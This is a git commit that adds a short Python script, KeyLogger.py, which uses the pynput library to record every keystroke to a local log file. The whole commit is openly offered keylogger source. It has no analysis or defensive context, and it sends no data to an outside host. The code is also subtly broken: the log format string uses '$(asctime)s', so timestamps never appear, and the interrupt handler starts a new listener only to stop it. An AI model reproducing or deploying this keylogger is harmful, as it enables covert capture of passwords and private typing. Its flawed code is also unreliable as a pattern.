f0906beb47dd6c477fa4ec18207f4a9b2e66518d
Gabriel Oliveira <oliveirasgah@gmail.com>
2017-10-12 14:53:58 -0300

    Add files via upload

---
+++ KeyLogger.py
@@ -0,0 +1,19 @@
+from pynput.keyboard import Listener
+import logging
+
+logDir = '/home/gabriel/'
+
+logging.basicConfig(filename=(logDir + 'log.txt'), level=logging.DEBUG, format='$(asctime)s: %(message)s')
+
+
+try:
+    def on_press(key):
+        logging.info(str(key))
+
+
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+except KeyboardInterrupt:
+    with Listener(on_press=on_press) as listener:
+        listener.stop()
